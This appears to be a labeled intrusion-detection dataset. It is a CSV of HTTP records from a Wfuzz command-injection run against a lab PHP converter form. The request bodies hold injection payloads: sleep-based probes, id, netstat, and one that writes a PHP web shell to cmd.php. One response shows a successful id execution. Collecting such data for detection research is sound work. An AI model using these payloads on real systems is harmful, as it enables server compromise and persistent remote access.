attack_tag,dst_ip,dst_port,req_body,req_header_Accept,req_header_Content_Length,req_header_Content_Type,req_header_Host,req_header_User_Agent,req_method,req_url,res_body,res_header_Connection,res_header_Content_Length,res_header_Content_Type,res_header_Date,res_header_Response_Code,res_header_Server,src_ip,src_port
cmdinj,192.168.1.34,80,ytlink=%27%20echo%20NPYOVU$((6%2B61))$(echo%20NPYOVU)NPYOVU\&send=send,*/*,70,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:44 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61391
cmdinj,192.168.1.34,80,ytlink=%27||echo$IFSJIUIDF$((89%2B41))$(echo$IFSJIUIDF)JIUIDF%2F%2F&send=send,*/*,77,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:45 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61392
cmdinj,192.168.1.34,80,ytlink=%22||echo$IFSBZQTDK$((6%2B37))$(echo$IFSBZQTDK)BZQTDK//&send=send,*/*,72,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:45 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61393
cmdinj,192.168.1.34,80,ytlink=%22&echo$IFSGVEIAO$((60%2B74))$(echo$IFSGVEIAO)GVEIAO%7C&send=send,*/*,73,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:45 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61394
cmdinj,192.168.1.34,80,ytlink=;echo$IFSOZHGXS$((54%2B58))$(echo$IFSOZHGXS)OZHGXS\&send=send,*/*,68,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:45 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61395
cmdinj,192.168.1.34,80,ytlink=%7Cecho$IFSRIYZJH$((86%2B76))$(echo$IFSRIYZJH)RIYZJH%7C&send=send,*/*,72,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:46 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61397
cmdinj,192.168.1.34,80,ytlink=||echo$IFSDAJJOA$((63%2B6))$(echo$IFSDAJJOA)DAJJOA//&send=send,*/*,69,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:46 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61398
cmdinj,192.168.1.34,80,ytlink=%7C%7Cecho$IFSEXCORO$((79%2B26))$(echo$IFSEXCORO)EXCORO%7C&send=send,*/*,75,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:46 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61399
cmdinj,192.168.1.34,80,"ytlink="")print(`echo%20SPTGKB`.`echo%20$((57%2B66))`.`echo%20SPTGKB`.`echo%20SPTGKB`)%29%7DSPTGKB&send=send",*/*,107,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:47 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61400
cmdinj,192.168.1.34,80,ytlink=');}print(`echo%20MMQDEE\necho%20$((77%2B28))\necho%20MMQDEE\necho%20MMQDEE`)%3B%25252523MMQDEE&send=send,*/*,112,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:47 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61401
cmdinj,192.168.1.34,80,ytlink=${exec(print(`echo%20BDBPSZ;echo%20$((87%2B50));echo%20BDBPSZ;echo%20BDBPSZ`)%3BBDBPSZ&send=send,*/*,103,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:47 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61402
cmdinj,192.168.1.34,80,ytlink=${popen(print(`echo%20XZRRJD`.`echo%20$((95%2B86))`.`echo%20XZRRJD`.`echo%20XZRRJD`)%3B.%27XZRRJD&send=send,*/*,114,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:48 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61403
cmdinj,192.168.1.34,80,ytlink=%7C%20%5B%205%20-ne%20%24%28echo%20ZDEVVW%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%27&send=send,*/*,139,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:49 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61404
cmdinj,192.168.1.34,80,ytlink=%3B%20str%3D%24%28echo%20YBRDJI%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%5C%5C&send=send,*/*,186,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:50 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61405
cmdinj,192.168.1.34,80,ytlink=%3B%20str%3D%24%28echo%20OKKNHF%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%7C&send=send,*/*,183,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:52 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61406
cmdinj,192.168.1.34,80,ytlink=%7C%20%5B%207%20-ne%20%24%28echo%20CXWPXJ%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%255C%255C&send=send,*/*,146,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:52 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61407
cmdinj,192.168.1.34,80,ytlink=%7C%20%5B%201%20-ne%20%24%28echo%20FTWOKG%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%257C&send=send,*/*,141,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:53 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61408
cmdinj,192.168.1.34,80,ytlink=%27%0A%20str%3D%24%28echo%20LMRVVK%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%27&send=send,*/*,186,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:53 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61410
cmdinj,192.168.1.34,80,ytlink=%27%3B%20str%3D%24%28echo%20ERVJHE%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%5C%5C&send=send,*/*,189,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:53 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61411
cmdinj,192.168.1.34,80,ytlink=%27%0A%20str%3D%24%28echo%20GIPRGX%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%26&send=send,*/*,186,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:53 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61412
cmdinj,192.168.1.34,80,ytlink=%27%0A%20str%3D%24%28echo%20GZKCJA%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%255C%255C&send=send,*/*,193,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:54 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61413
cmdinj,192.168.1.34,80,ytlink=%27%0A%20str%3D%24%28echo%20ROEZHE%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%257C&send=send,*/*,188,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:54 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61414
cmdinj,192.168.1.34,80,ytlink=%22%0A%20str%3D%24%28echo%20ROWALZ%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%27&send=send,*/*,186,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:54 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61415
cmdinj,192.168.1.34,80,ytlink=%22%7C%20%5B%204%20-ne%20%24%28echo%20YPWXZB%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%5C%5C&send=send,*/*,145,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:55 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61416
cmdinj,192.168.1.34,80,ytlink=%22%3B%20str%3D%24%28echo%20GRQQCI%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%203%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2527&send=send,*/*,188,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:55 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61417
cmdinj,192.168.1.34,80,ytlink=%0Aid&send=send,*/*,22,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"uid=33(www-data) gid=33(www-data) groups=33(www-data)   <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,333,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:55 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61418
cmdinj,192.168.1.34,80,"ytlink=; echo ""<?php system($_GET['cmd']); ?>"" > cmd.php&send=send",*/*,66,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:56 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61419
cmdinj,192.168.1.34,80,ytlink=&& netstat -an&send=send,*/*,31,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:57 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61421
cmdinj,192.168.1.34,80,ytlink=; sleep 15&send=send,*/*,27,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:57:12 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61423
cmdinj,192.168.1.34,80,ytlink=& systeminfo&send=send,*/*,29,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:57:07 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61424
cmdinj,192.168.1.34,80,ytlink=a)|/usr/bin/id&send=send,*/*,31,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:57:36 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61428
